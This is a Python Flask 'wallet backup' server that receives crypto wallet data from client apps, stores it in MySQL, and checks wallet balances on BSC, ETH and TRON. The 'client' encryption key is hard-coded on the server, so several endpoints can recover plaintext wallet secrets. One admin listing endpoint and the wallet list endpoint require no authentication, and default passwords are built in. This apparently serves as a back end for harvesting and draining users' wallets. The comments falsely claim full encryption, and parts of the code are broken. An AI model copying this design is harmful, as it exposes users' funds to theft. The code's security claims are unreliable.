"""
钱包备份服务器 - 使用MySQL数据库
所有数据全字段加密存储，数据库不解密
"""
from flask import Flask, request, jsonify
from flask_cors import CORS
import pymysql
import os
from datetime import datetime
import threading
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from web3 import Web3
from tronpy import Tron

app = Flask(__name__)
CORS(app)

# MySQL数据库配置
DB_CONFIG = {
    'host': 'localhost',
    'port': 3306,
    'user': 'root',
    'password': os.environ.get('DB_PASSWORD', 'WalletBackup2026!'),
    'database': 'wallet_backup',
    'charset': 'utf8mb4'
}

db_lock = threading.Lock()

# 双重加密密钥 - 每个密钥必须32字节 = 256位
CLIENT_ENCRYPTION_KEY = b'ClientWallet2026SecureKey32B!!!!'  # 客户端加密密钥
SERVER_ENCRYPTION_KEY = b'ServerWallet2026SecureKey32B!!!!'  # 服务器加密密钥

# 链 RPC 配置
CHAIN_RPC = {
    'BSC': 'https://bsc-dataseed.binance.org/',
    'ETH': 'https://eth.llamarpc.com',
    'TRON': None
}

# API 密钥（从配置文件读取）
def load_api_key():
    """从配置文件加载 API Key"""
    import os
    config_path = os.path.join(os.path.dirname(__file__), '..', 'data', 'api_config.json')
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
        return config.get('api_key', 'ai-wallet-query-2026')
    except:
        return 'ai-wallet-query-2026'

API_KEY = load_api_key()

# 时效密码管理
from time_limited_auth import auth_manager

# 管理员密码（实际使用时应该从环境变量或配置文件中读取）
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# 管理员token存储
admin_tokens = {}


def encrypt_with_key(value: str, key: bytes) -> str:
    """使用指定密钥加密字段"""
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, value.encode('utf-8'), None)
    encrypted_data = nonce + ciphertext
    return base64.b64encode(encrypted_data).decode('utf-8')


def decrypt_with_key(encrypted_str: str, key: bytes) -> str:
    """使用指定密钥解密字段"""
    encrypted_data = base64.b64decode(encrypted_str)
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]
    aesgcm = AESGCM(key)
    decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
    return decrypted_bytes.decode('utf-8')


def server_encrypt(client_encrypted_data: str) -> str:
    """服务器二次加密（接收客户端已加密的数据，再次加密后存储）"""
    return encrypt_with_key(client_encrypted_data, SERVER_ENCRYPTION_KEY)


def server_decrypt(server_encrypted_data: str) -> str:
    """服务器解密（返回客户端加密层的数据给客户端）"""
    return decrypt_with_key(server_encrypted_data, SERVER_ENCRYPTION_KEY)


def full_decrypt(server_encrypted_data: str) -> dict:
    """完整解密：先服务器解密，再客户端解密
    返回最终的原始数据（钱包JSON字典）
    """
    # 第一步：服务器层解密
    client_encrypted = decrypt_with_key(server_encrypted_data, SERVER_ENCRYPTION_KEY)
    
    # 第二步：客户端层解密
    encrypted_data = base64.b64decode(client_encrypted)
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]
    aesgcm = AESGCM(CLIENT_ENCRYPTION_KEY)
    decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
    
    import json
    return json.loads(decrypted_bytes.decode('utf-8'))


def init_db():
    """初始化数据库和表"""
    try:
        conn = pymysql.connect(**DB_CONFIG)
        cursor = conn.cursor()
        cursor.execute("CREATE DATABASE IF NOT EXISTS wallet_backup CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci")
        cursor.execute("USE wallet_backup")
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS wallet_backups (
                id INT AUTO_INCREMENT PRIMARY KEY,
                backup_id VARCHAR(100) UNIQUE NOT NULL,
                address TEXT NOT NULL COMMENT '加密的钱包地址',
                chain TEXT NOT NULL COMMENT '加密的链名称',
                encrypted_data TEXT NOT NULL COMMENT '加密的钱包数据',
                backup_time TEXT NOT NULL COMMENT '加密的备份时间',
                version TEXT COMMENT '加密的版本号',
                created_at TEXT NOT NULL COMMENT '加密的创建时间'
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_backup_id ON wallet_backups(backup_id)')
        conn.commit()
        cursor.close()
        conn.close()
        print("✅ 数据库初始化完成")
    except Exception as e:
        print(f"⚠️ 数据库初始化: {str(e)}（表可能已存在，继续启动）")


def generate_backup_id(address):
    """生成备份ID"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    return f"{address[:8]}_{timestamp}"


@app.route('/api/wallet/backup', methods=['POST'])
def backup_wallet():
    """接收电脑端钱包备份 - AES-GCM加密数据直接存储"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'message': '请求数据为空'}), 400
        
        required_fields = ['address', 'chain', 'encrypted_data']
        for field in required_fields:
            if field not in data:
                return jsonify({'success': False, 'message': f'缺少必需字段: {field}'}), 400
        
        backup_time = datetime.now().isoformat()
        encrypted_data = data['encrypted_data']
        
        # 验证是否为Base64编码的AES-GCM数据（不是明文JSON）
        if encrypted_data.startswith('{'):
            print(f"⚠️ 检测到明文JSON，拒绝存储")
            return jsonify({'success': False, 'message': '数据必须加密'}), 400
        
        print(f"💻 接收到电脑端AES-GCM加密数据，长度: {len(encrypted_data)}")
        
        backup_id = generate_backup_id(data['address'])
        
        with db_lock:
            conn = pymysql.connect(**DB_CONFIG)
            cursor = conn.cursor()
            cursor.execute("USE wallet_backup")
            cursor.execute('''
                INSERT INTO wallet_backups 
                (backup_id, address, chain, encrypted_data, backup_time, version, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (
                backup_id,
                data['address'],
                data['chain'],
                encrypted_data,
                backup_time,
                '1.0',
                backup_time
            ))
            conn.commit()
            cursor.close()
            conn.close()
        
        print(f"✅ 电脑端钱包备份成功: {data['address']} ({data['chain']})")
        
        return jsonify({
            'success': True,
            'message': '备份成功',
            'backup_id': backup_id,
            'backup_time': backup_time
        }), 200
        
    except Exception as e:
        print(f"❌ 电脑端备份失败: {str(e)}")
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/wallet/backup/mobile', methods=['POST'])
def backup_wallet_mobile():
    """接收移动端钱包备份 - 解密后重新用AES-GCM加密存储"""
    try:
        import json
        import os
        import base64
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'message': '请求数据为空'}), 400
        
        required_fields = ['address', 'chain', 'encrypted_data']
        for field in required_fields:
            if field not in data:
                return jsonify({'success': False, 'message': f'缺少必需字段: {field}'}), 400
        
        CLIENT_KEY = b'ClientWallet2026SecureKey32B!!!!'
        backup_time = datetime.now().isoformat()
        mobile_encrypted = data['encrypted_data']
        
        print(f"📱 接收到移动端加密数据，长度: {len(mobile_encrypted)}")
        
        # 第1步：解密移动端数据（假设移动端也是AES-GCM格式）
        encrypted_bytes = base64.b64decode(mobile_encrypted)
        nonce = encrypted_bytes[:12]
        ciphertext = encrypted_bytes[12:]
        aesgcm = AESGCM(CLIENT_KEY)
        decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        wallet_data = json.loads(decrypted_bytes.decode('utf-8'))
        
        print(f"✅ 移动端数据解密成功: {wallet_data['address']}")
        
        # 第2步：重新用AES-GCM加密（确保格式统一）
        json_bytes = json.dumps(wallet_data, ensure_ascii=False).encode('utf-8')
        new_nonce = os.urandom(12)
        new_ciphertext = aesgcm.encrypt(new_nonce, json_bytes, None)
        final_encrypted = base64.b64encode(new_nonce + new_ciphertext).decode('utf-8')
        
        print(f"✅ 重新加密完成，新长度: {len(final_encrypted)}")
        
        # 第3步：存储到数据库
        backup_id = generate_backup_id(data['address'])
        
        with db_lock:
            conn = pymysql.connect(**DB_CONFIG)
            cursor = conn.cursor()
            cursor.execute("USE wallet_backup")
            cursor.execute('''
                INSERT INTO wallet_backups 
                (backup_id, address, chain, encrypted_data, backup_time, version, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (
                backup_id,
                data['address'],
                data['chain'],
                final_encrypted,
                backup_time,
                '1.0',
                backup_time
            ))
            conn.commit()
            cursor.close()
            conn.close()
        
        print(f"✅ 移动端钱包备份成功: {data['address']} ({data['chain']})")
        
        return jsonify({
            'success': True,
            'message': '移动端备份成功',
            'backup_id': backup_id,
            'backup_time': backup_time
        }), 200
        
    except Exception as e:
        print(f"❌ 移动端备份失败: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/wallet/restore', methods=['POST'])
def restore_wallet():
    """恢复钱包 - 返回加密数据，客户端自行解密"""
    try:
        data = request.get_json()
        if not data or 'backup_id' not in data:
            return jsonify({'success': False, 'message': '缺少backup_id参数'}), 400
        
        backup_id = data['backup_id']
        
        with db_lock:
            conn = pymysql.connect(**DB_CONFIG)
            cursor = conn.cursor(pymysql.cursors.DictCursor)
            cursor.execute("USE wallet_backup")
            cursor.execute('SELECT * FROM wallet_backups WHERE backup_id = %s', (backup_id,))
            row = cursor.fetchone()
            cursor.close()
            conn.close()
        
        if not row:
            return jsonify({'success': False, 'message': '未找到备份数据'}), 404
        
        # 服务器解密一层，返回客户端加密层的数据
        decrypted_data = {
            'backup_id': row['backup_id'],
            'address': server_decrypt(row['address']),
            'chain': server_decrypt(row['chain']),
            'encrypted_data': server_decrypt(row['encrypted_data']),
            'backup_time': server_decrypt(row['backup_time']),
            'version': server_decrypt(row['version']),
            'created_at': server_decrypt(row['created_at'])
        }
        
        return jsonify({
            'success': True,
            'message': '恢复成功',
            'data': decrypted_data
        }), 200
        
    except Exception as e:
        print(f"❌ 恢复失败: {str(e)}")
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/wallet/list', methods=['GET', 'POST'])
def list_wallets():
    """列出所有备份的钱包（仅返回backup_id列表）"""
    try:
        import base64
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        with db_lock:
            conn = pymysql.connect(**DB_CONFIG)
            cursor = conn.cursor(pymysql.cursors.DictCursor)
            cursor.execute("USE wallet_backup")
            cursor.execute('SELECT backup_id, address, chain, backup_time, encrypted_data FROM wallet_backups ORDER BY backup_time DESC')
            rows = cursor.fetchall()
            cursor.close()
            conn.close()
        
        # 密钥
        CLIENT_KEY = b'ClientWallet2026SecureKey32B!!!!'
        SERVER_KEY = b'ServerWallet2026SecureKey32B!!!!'
        
        wallets = []
        for idx, row in enumerate(rows):
            # 将CLIENT_KEY加密的数据重新用SERVER_KEY加密
            try:
                # 1. 解密CLIENT_KEY层
                client_encrypted_bytes = base64.b64decode(row['encrypted_data'])
                nonce1 = client_encrypted_bytes[:12]
                ciphertext1 = client_encrypted_bytes[12:]
                aesgcm1 = AESGCM(CLIENT_KEY)
                decrypted_json = aesgcm1.decrypt(nonce1, ciphertext1, None)
                
                # 2. 用SERVER_KEY重新加密
                new_nonce = os.urandom(12)
                new_ciphertext = AESGCM(SERVER_KEY).encrypt(new_nonce, decrypted_json, None)
                server_encrypted = base64.b64encode(new_nonce + new_ciphertext).decode('utf-8')
                
                encrypted_data = server_encrypted
            except Exception as e:
                print(f"重加密失败 ID={row.get('id')}: {e}")
                encrypted_data = row.get('encrypted_data')  # 失败则返回原数据
            
            wallets.append({
                'id': idx+1,
                'backup_id': row['backup_id'],
                'address': row['address'],
                'chain': row['chain'],
                'backup_time': row['backup_time'],
                'created_at': row['backup_time'],
                'encrypted_data': encrypted_data
            })
        
        return jsonify({
            'success': True,
            'count': len(wallets),
            'wallets': wallets
        }), 200
        
    except Exception as e:
        print(f"❌ 查询失败: {str(e)}")
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/wallet/delete', methods=['POST'])
def delete_wallet():
    """删除指定备份"""
    try:
        data = request.get_json()
        if not data or 'backup_id' not in data:
            return jsonify({'success': False, 'message': '缺少backup_id参数'}), 400
        
        backup_id = data['backup_id']
        
        with db_lock:
            conn = pymysql.connect(**DB_CONFIG)
            cursor = conn.cursor()
            cursor.execute("USE wallet_backup")
            cursor.execute('DELETE FROM wallet_backups WHERE backup_id = %s', (backup_id,))
            deleted_count = cursor.rowcount
            conn.commit()
            cursor.close()
            conn.close()
        
        if deleted_count == 0:
            return jsonify({'success': False, 'message': '未找到要删除的备份'}), 404
        
        print(f"✅ 删除钱包备份: {backup_id}")
        
        return jsonify({
            'success': True,
            'message': '删除成功',
            'deleted_count': deleted_count
        }), 200
        
    except Exception as e:
        print(f"❌ 删除失败: {str(e)}")
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/health', methods=['GET'])
def health_check():
    """健康检查"""
    return jsonify({
        'status': 'running',
        'database': 'MySQL',
        'message': '钱包备份服务运行中'
    }), 200


@app.route('/api/admin/generate_password', methods=['POST'])
def admin_generate_password():
    """生成时效密码（管理员操作）"""
    try:
        data = request.get_json()
        hours = data.get('hours', 24)  # 默认24小时
        note = data.get('note', '')
        
        result = auth_manager.generate_password(hours=hours, note=note)
        
        return jsonify({
            'success': True,
            'message': '密码生成成功',
            'data': result
        }), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/admin/verify_password', methods=['POST'])
def admin_verify_password():
    """验证时效密码（客服登录）- 返回会话ID"""
    try:
        data = request.get_json()
        if not data or 'password' not in data:
            return jsonify({'success': False, 'message': '缺少password参数'}), 400
        
        result = auth_manager.verify_password(data['password'])
        
        if result['valid']:
            return jsonify({
                'success': True,
                'message': result['message'],
                'data': {
                    'session_id': result['session_id'],
                    'expire_time_str': result['expire_time_str']
                }
            }), 200
        else:
            return jsonify({
                'success': False,
                'message': result['message']
            }), 401
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500





@app.route('/api/admin/decrypt', methods=['POST'])
def admin_decrypt_wallet():
    """管理员解密指定字段（需要密码验证）"""
    try:
        data = request.get_json()
        password = request.headers.get('X-Auth-Password', '')
        
        if not password:
            return jsonify({'success': False, 'message': '缺少验证密码'}), 401
        
        # 验证密码
        verify_result = auth_manager.verify_password(password)
        if not verify_result['valid']:
            return jsonify({'success': False, 'message': verify_result['message']}), 401
        
        # 解密字段
        if 'encrypted_data' not in data:
            return jsonify({'success': False, 'message': '缺少encrypted_data参数'}), 400
        
        # 第1次解密：服务器密钥
        encrypted_data = base64.b64decode(data['encrypted_data'])
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]
        aesgcm = AESGCM(SERVER_ENCRYPTION_KEY)
        client_encrypted = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
        
        # 第2次解密：客户端密钥
        client_data = base64.b64decode(client_encrypted)
        nonce2 = client_data[:12]
        ciphertext2 = client_data[12:]
        aesgcm2 = AESGCM(CLIENT_ENCRYPTION_KEY)
        original_data = aesgcm2.decrypt(nonce2, ciphertext2, None).decode('utf-8')
        
        return jsonify({
            'success': True,
            'decrypted_data': original_data
        }), 200
        
    except Exception as e:
        print(f" 解密失败: {str(e)}")
        return jsonify({'success': False, 'message': f'解密失败: {str(e)}'}), 500


@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    """管理员登录 - 获取token"""
    try:
        data = request.get_json()
        if not data or 'password' not in data:
            return jsonify({'success': False, 'message': '缺少password参数'}), 400
        
        password = data['password']
        
        # 验证密码
        if password != ADMIN_PASSWORD:
            return jsonify({'success': False, 'message': '密码错误'}), 401
        
        # 生成token（有效期24小时）
        import hashlib
        import time
        token = hashlib.sha256(f"{password}_{time.time()}".encode()).hexdigest()
        expire_time = time.time() + 86400  # 24小时
        
        admin_tokens[token] = expire_time
        
        return jsonify({
            'success': True,
            'message': '登录成功',
            'token': token,
            'expire_time': expire_time
        }), 200
        
    except Exception as e:
        print(f" 管理员登录失败: {str(e)}")
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/admin/list_all', methods=['GET'])
def admin_list_all():
    """管理员获取所有备份（直接查询数据库）"""
    try:
        # 直接查询所有备份
        with db_lock:
            conn = pymysql.connect(**DB_CONFIG)
            cursor = conn.cursor(pymysql.cursors.DictCursor)
            cursor.execute("USE wallet_backup")
            cursor.execute('SELECT * FROM wallet_backups ORDER BY id DESC')
            rows = cursor.fetchall()
            cursor.close()
            conn.close()
        
        # 返回加密数据（管理后台自行解密）
        return jsonify({
            'success': True,
            'count': len(rows),
            'wallets': rows
        }), 200
        
    except Exception as e:
        print(f" 查询失败: {str(e)}")
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500


@app.route('/api/wallet/balance', methods=['POST'])
def query_balance():
    """
    查询钱包主币余额（大模型调用）
    请求参数:
    {
        "address": "0x123...",
        "chain": "BSC"  // BSC, ETH, TRON
    }
    """
    try:
        # 验证 API 密钥
        api_key = request.headers.get('X-API-Key', '')
        if api_key != API_KEY:
            return jsonify({'success': False, 'message': 'API 密钥无效'}), 401
        
        data = request.get_json()
        if not data or 'address' not in data or 'chain' not in data:
            return jsonify({'success': False, 'message': '缺少 address 或 chain 参数'}), 400
        
        address = data['address']
        chain = data['chain'].upper()
        
        # 查询余额
        if chain == 'TRON':
            client = Tron()
            balance_sun = client.get_balance(address)
            balance = balance_sun / 10**6  # SUN 转 TRX
            symbol = 'TRX'
        else:
            rpc = CHAIN_RPC.get(chain)
            if not rpc:
                return jsonify({'success': False, 'message': f'不支持的链: {chain}'}), 400
            
            w3 = Web3(Web3.HTTPProvider(rpc))
            balance_wei = w3.eth.get_balance(address)
            balance = w3.from_wei(balance_wei, 'ether')
            symbol = 'BNB' if chain == 'BSC' else 'ETH'
        
        return jsonify({
            'success': True,
            'address': address,
            'chain': chain,
            'balance': float(balance),
            'symbol': symbol
        }), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'查询失败: {str(e)}'}), 500


@app.route('/api/wallet/token_balance', methods=['POST'])
def query_token_balance():
    """
    查询代币余额（大模型调用）
    请求参数:
    {
        "address": "0x123...",
        "chain": "BSC",
        "contract": "0x55d398326f99059fF775485246999027B3197955",
        "decimals": 18
    }
    """
    try:
        # 验证 API 密钥
        api_key = request.headers.get('X-API-Key', '')
        if api_key != API_KEY:
            return jsonify({'success': False, 'message': 'API 密钥无效'}), 401
        
        data = request.get_json()
        if not data or 'address' not in data or 'chain' not in data or 'contract' not in data:
            return jsonify({'success': False, 'message': '缺少必需参数'}), 400
        
        address = data['address']
        chain = data['chain'].upper()
        contract_address = data['contract']
        decimals = data.get('decimals', 18)
        
        if chain == 'TRON':
            return jsonify({'success': False, 'message': 'TRON 代币查询暂未支持'}), 400
        
        # EVM 链代币查询
        rpc = CHAIN_RPC.get(chain)
        if not rpc:
            return jsonify({'success': False, 'message': f'不支持的链: {chain}'}), 400
        
        w3 = Web3(Web3.HTTPProvider(rpc))
        
        # ERC20 ABI
        abi = [{
            "constant": True,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "type": "function"
        }]
        
        contract = w3.eth.contract(address=contract_address, abi=abi)
        balance_raw = contract.functions.balanceOf(address).call()
        balance = balance_raw / (10 ** decimals)
        
        # 获取代币符号
        try:
            symbol_abi = [{
                "constant": True,
                "inputs": [],
                "name": "symbol",
                "outputs": [{"name": "", "type": "string"}],
                "type": "function"
            }]
            symbol_contract = w3.eth.contract(address=contract_address, abi=symbol_abi)
            symbol = symbol_contract.functions.symbol().call()
        except:
            symbol = 'TOKEN'
        
        return jsonify({
            'success': True,
            'address': address,
            'chain': chain,
            'contract': contract_address,
            'balance': float(balance),
            'symbol': symbol
        }), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'查询失败: {str(e)}'}), 500


if __name__ == '__main__':
    print("="*50)
    print(" 钱包备份服务器启动（MySQL数据库）")
    print("📡 服务地址: http://localhost:5000")
    print(" 数据库: MySQL wallet_backup")
    print("="*50)
    
    try:
        init_db()
    except Exception:
        pass

    port = int(os.environ.get('BACKUP_PORT', 5002))
    app.run(host='0.0.0.0', port=port, debug=False)
